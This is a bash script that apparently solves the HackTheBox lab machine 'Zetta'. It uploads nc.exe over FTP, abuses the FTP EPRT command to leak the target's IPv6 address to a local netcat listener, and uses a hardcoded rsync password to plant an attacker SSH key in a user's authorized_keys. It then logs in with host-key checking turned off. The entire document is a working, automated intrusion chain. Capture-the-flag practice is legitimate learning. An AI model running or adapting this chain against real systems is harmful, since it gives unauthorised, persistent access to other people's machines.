#/bin/env bash

RHOST="10.10.10.156"
LPORT=23456
LFILE="/usr/share/windows-binaries/nc.exe"
RFILE="nc.exe"

# Generating random 32 characters username and password
echo -n "Random username: "
FTPUSER=$(echo $RANDOM | md5sum | cut -d" " -f1)
echo $FTPUSER

# Uploading nc.exe to the FTP server
echo "Uploading nc.exe on Zetta..."
CMDS="INPUT.txt"
echo "quote USER $FTPUSER" > $CMDS
echo "quote PASS $FTPUSER" >> $CMDS
echo "put $LFILE $RFILE" >> $CMDS
echo "exit" >> $CMDS
ftp -n $RHOST < $CMDS

# Retrieve local ipv6
LHOST6=$(ifconfig tun0 | grep "inet6 dead:beef" | awk '{print $2'})

# Starting netcat listener in background
echo "Starting listener to grab Zetta ipv6 address..."
IPV6FILE="zettaipv6"
nc -v6l $LHOST6 $LPORT > $IPV6FILE 2>&1 &

# Retriving nc.exe on ipv6
echo "Forcing Zetta to serve a file over ipv6..."
echo "USER $FTPUSER" > $CMDS
echo "PASS $FTPUSER" >> $CMDS
echo "EPRT |2|$LHOST6|$LPORT" >> $CMDS
echo "RETR $RFILE" >> $CMDS
echo "QUIT" >> $CMDS
nc -n $RHOST 21 < $CMDS >/dev/null 2>&1

rm $CMDS
sleep 5
killall nc 2>/dev/null

# Parsing ipv6 from netcat output
if [ -f $IPV6FILE ]; then
  RHOST6=$(head -n4 $IPV6FILE | grep "Connection from dead:beef" | cut -d" " -f4 | head -n1 | cut -d"." -f1)
  echo "Zetta ipv6: $RHOST6"
else
  echo "Unable to retrieve Zetta ipv6. Exiting."
  rm $CMDS
  exit 1
fi

echo "Generating ssh keys..."
KEYPATH="/root/.ssh/id_rsa_royzetta"
rm $KEYPATH* 2>/dev/null
ssh-keygen -t rsa -N "" -f /root/.ssh/id_rsa_royzetta >/dev/null 2>&1

echo "Generating evil .ssh folder to upload..."
DSSH="/tmp/TEMPSSH"
rm -rf $DSSH 2>/dev/null
mkdir $DSSH
chmod 700 $DSSH
cp $KEYPATH.pub $DSSH/authorized_keys
chmod 644 $DSSH/authorized_keys
chown -R 1000:1000 $DSSH

echo "Uploading .ssh folder to /home/roy/..."
TMPPASS="tmp_pass"
echo "computer" > $TMPPASS
rsync -av --password-file $TMPPASS $DSSH/ rsync://roy@[$RHOST6]:8730/home_roy/.ssh >/dev/null 2>/dev/null
rm $TMPPASS
rm -rf $DSSH

echo "From now now you can log in with 'ssh roy@$RHOST'."
echo "Logging in for you..."

ssh -o "StrictHostKeyChecking no" roy@$RHOST
